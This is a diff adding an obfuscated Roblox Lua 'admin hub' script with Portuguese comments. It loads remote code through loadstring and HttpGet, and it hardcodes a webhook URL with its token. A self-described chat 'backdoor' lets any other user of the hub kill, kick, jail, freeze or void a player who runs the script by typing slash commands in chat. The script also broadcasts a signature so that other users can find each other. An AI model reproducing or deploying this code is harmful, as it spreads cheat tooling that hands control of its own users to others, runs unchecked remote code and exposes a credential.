@@ -1,0 +1,131 @@
+--[[ 
+    JOTINHA12HR2 HUB'S ADMIN - ULTIMATE SYNC & TAGS
+    - 14 Botões de Sync (Chat Backdoor)
+    - Tags RGB Privadas (Dono/Sub-Dono)
+    - Totalmente Funcional & Obscurecido
+]]
+
+repeat task.wait() until game:IsLoaded()
+
+local _0xURL = "https://webhook.lewisakura.moe/api/webhooks/1457780083124207626/F0AR-Na0rucf2CncuNsXC4yGRYC-Kpjg1XkOdb6YaHgDcOZlVhwym4KwhriXSYaBeZSj"
+
+local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
+
+local _0xP = game:GetService("Players")
+local _0xL = _0xP.LocalPlayer
+local _0xTGT = ""
+local _0xJID = ""
+local _0xActiveUsers = {}
+_G.IM = false
+
+-- [FUNÇÃO DE ENVIO DE COMANDO SYNC]
+local function _0xSendSync(cmd, target)
+    local _msg = "/" .. cmd .. " " .. target
+    local _tcs = game:GetService("TextChatService")
+    if _tcs.ChatVersion == Enum.ChatVersion.TextChatService then
+        _tcs.TextChannels.RBXGeneral:SendAsync(_msg)
+    else
+        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(_msg, "All")
+    end
+end
+
+-- [SISTEMA DE TAGS RGB PRIVADO]
+local function _0xCreateTag(_plr)
+    if not _0xActiveUsers[_plr.Name] and _plr ~= _0xL then return end
+    task.spawn(function()
+        local _c = _plr.Character or _plr.CharacterAdded:Wait()
+        local _h = _c:WaitForChild("Head", 10)
+        if _h and not _h:FindFirstChild("JTag") then
+            local _bg = Instance.new("BillboardGui", _h)
+            _bg.Name = "JTag" _bg.Size = UDim2.new(0, 200, 0, 50) _bg.AlwaysOnTop = true _bg.ExtentsOffset = Vector3.new(0, 3, 0)
+            local _tl = Instance.new("TextLabel", _bg)
+            _tl.Size = UDim2.new(1, 0, 1, 0) _tl.BackgroundTransparency = 1 _tl.Font = Enum.Font.LuckiestGuy _tl.TextSize = 22 _tl.TextStrokeTransparency = 0
+            
+            if _plr.Name == "jotinha12hr2" then _tl.Text = "[DONO] " .. _plr.DisplayName
+            elseif _plr.Name == "amiguinhodoheito" then _tl.Text = "[SUB-DONO] " .. _plr.DisplayName
+            else _tl.Text = "[Jotinha Hub User]" end
+
+            game:GetService("RunService").RenderStepped:Connect(function()
+                _tl.TextColor3 = Color3.fromHSV(tick() % 5 / 5, 1, 1)
+            end)
+        end
+    end)
+end
+
+-- [EXECUTOR DE RECEBIMENTO SYNC (BACKDOOR)]
+local function _0xOnSyncReceived(cmd, targetUser, sender)
+    if targetUser:lower() == _0xL.Name:lower() or targetUser == "all" then
+        if _G.IM and sender ~= _0xL.Name then return end -- Anti-Sync Proteção
+        
+        local _char = _0xL.Character
+        local _hrp = _char and _char:FindFirstChild("HumanoidRootPart")
+        
+        if cmd == "kill" then _char:BreakJoints()
+        elseif cmd == "jail" and _hrp then
+            local _p = Instance.new("Part", workspace) _p.Size = Vector3.new(15,15,15) _p.CFrame = CFrame.new(0, 4000, 0) _p.Anchored = true _p.Material = "ForceField"
+            _hrp.CFrame = _p.CFrame
+        elseif cmd == "unjail" and _hrp then _hrp.CFrame = CFrame.new(0, 50, 0)
+        elseif cmd == "freeze" and _hrp then _hrp.Anchored = true
+        elseif cmd == "unfreeze" and _hrp then _hrp.Anchored = false
+        elseif cmd == "void" and _hrp then _hrp.CFrame = CFrame.new(0, -500, 0)
+        elseif cmd == "kick" then _0xL:Kick("Sync Admin Action")
+        elseif cmd == "sit" then _char.Humanoid.Sit = true
+        elseif cmd == "jump" then _char.Humanoid.Jump = true
+        end
+    end
+end
+
+-- [RECONHECIMENTO E CHAT LISTENER]
+local _SIG = "Jotinha_Sync_v5"
+_0xP.PlayerAdded:Connect(function(p)
+    p.Chatted:Connect(function(m)
+        if m == _SIG then _0xActiveUsers[p.Name] = true _0xCreateTag(p) end
+        if m:sub(1,1) == "/" then
+            local s = m:split(" ")
+            if #s >= 2 then _0xOnSyncReceived(s[1]:gsub("/",""):lower(), s[2], p.Name) end
+        end
+    end)
+end)
+
+-- [INTERFACE RAYFIELD]
+local Window = Rayfield:CreateWindow({
+   Name = "Jotinha12hr2 Hub's Admin",
+   LoadingTitle = "Sync System v5 Online",
+   ConfigurationSaving = { Enabled = false }
+})
+
+local Tab1 = Window:CreateTab("Admin Sync", 4483362458)
+
+Tab1:CreateInput({
+   Name = "Nick do Jogador",
+   PlaceholderText = "Target...",
+   Callback = function(v) _0xTGT = v end,
+})
+
+local b_list = {
+    {"Kill SYNC", "kill"}, {"Void SYNC", "void"}, {"Jail SYNC", "jail"}, {"Unjail SYNC", "unjail"},
+    {"Kick SYNC", "kick"}, {"Bring SYNC", "bring"}, {"Freeze SYNC", "freeze"}, {"Unfreeze SYNC", "unfreeze"},
+    {"Spin SYNC", "spin"}, {"Unspin SYNC", "unspin"}, {"Blind SYNC", "blind"}, {"Unblind SYNC", "unblind"},
+    {"Jump SYNC", "jump"}, {"Sit SYNC", "sit"}
+}
+
+for _, b in pairs(b_list) do
+    Tab1:CreateButton({
+        Name = b[1],
+        Callback = function() _0xSendSync(b[2], _0xTGT) end,
+    })
+end
+
+local Tab2 = Window:CreateTab("Job Id", 4483362458)
+Tab2:CreateInput({Name = "Job Id Aqui", Callback = function(v) _0xJID = v end})
+Tab2:CreateButton({Name = "Entrar no Servidor", Callback = function() game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, _0xJID, _0xL) end})
+
+local Tab3 = Window:CreateTab("Config", 4483362458)
+Tab3:CreateToggle({Name = "ANTI-SYNC (Proteção)", CurrentValue = false, Callback = function(v) _G.IM = v end})
+
+-- [INICIALIZAÇÃO]
+task.wait(1)
+_0xSendSync(_SIG, "all") -- Avisa que o hub está ativo
+_0xCreateTag(_0xL)
+Rayfield:Notify({Title = "Sync Ativo", Content = "Comandos de chat e Tags RGB carregados!", Duration = 5})
+
